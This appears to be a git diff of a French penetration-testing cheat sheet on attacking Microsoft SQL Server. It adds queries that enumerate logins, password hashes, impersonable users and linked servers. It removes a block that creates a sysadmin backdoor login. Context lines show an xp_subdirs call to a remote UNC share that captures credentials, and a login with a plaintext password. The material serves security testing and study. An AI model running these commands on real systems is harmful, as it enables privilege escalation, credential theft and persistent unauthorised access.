@@ -55,9 +55,19 @@ SELECT IS_SRVROLEMEMBER('sysadmin'); -- retourne 0 si nous ne sommes pas membre
 -- List users
 select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
 
+-- List users that current user can impersonate 
+--    if found : we need to impersonate each user available and enumerate again (see Exploitation below to see how to impersonate)
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
+
+
 -- List Linked servers
-SELECT srvname, isremote FROM sysservers;
+SELECT srvname, isremote FROM sysservers WHERE isremote = 0; -- 0 means linked server
+EXEC sp_linkedservers
+SELECT * FROM sys.servers;
+
 ```
+
+Si un serveur lié (Linked Server) est découvert, on pourra tenter d'y accéder, vérifier si nous disposons de privilèges différents sur celui-ci. Voir la partie `Exploitation` plus bas sur cette page.
 
 ##### Exploration de l'instance de base de donnée
 ```
@@ -70,20 +80,6 @@ USE master;
 
 -- Get table names
 SELECT table_name FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
-
--- Identify Linked Servers
-1> 
-2> GO
-
-srvname                             isremote
------------------------------------ --------
-DESKTOP-MFERMN4\SQLEXPRESS          1
-10.0.0.12\SQLEXPRESS                0        <== isremote = 0 ===> LINKED SERVER
-
--- List Linked Servers
-EXEC sp_linkedservers
-SELECT * FROM sys.servers;
-
 ```
 
 ## Outils utiles
@@ -121,13 +117,6 @@ mssqlclient.py -p 1433 -windows-auth WIN-02/mssqlsvc:princess1@$TARGET_IP
 
 
 ### Exploitation
-#### Création de compte
-```sql
-------------------------------------------------------------------------
--- Create user with sysadmin privs
-CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!';
-EXEC sp_addsrvrolemember 'hacker', 'sysadmin';
-```
 
 #### Exécution de commandes
 
@@ -190,9 +179,7 @@ EXEC master..xp_subdirs '\\10.10.110.17\share\'
 #### User Impersonate
 
 ```
--- Liste des users que l'on peut "impersonate"
-SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
-GO
+
 
 -- Exploitation
 user master; -- db sur laquelle on est sur d'avoir les droits
